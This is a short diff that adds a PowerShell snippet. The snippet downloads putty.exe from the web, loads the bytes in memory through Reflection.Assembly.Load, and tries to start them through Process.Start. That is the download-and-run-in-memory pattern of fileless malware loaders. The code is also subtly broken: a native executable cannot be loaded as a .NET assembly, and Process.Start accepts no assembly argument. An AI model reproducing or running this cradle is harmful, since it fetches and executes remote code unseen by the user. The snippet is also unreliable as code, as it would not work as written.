@@ -1,0 +1,5 @@
+$client = New-Object System.Net.WebClient
+$url = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe'
+$data = $client.DownloadData($url)
+$assembly = [System.Reflection.Assembly]::Load($data)
+[System.Diagnostics.Process]::Start([System.IO.Path]::GetTempFileName(), $assembly)
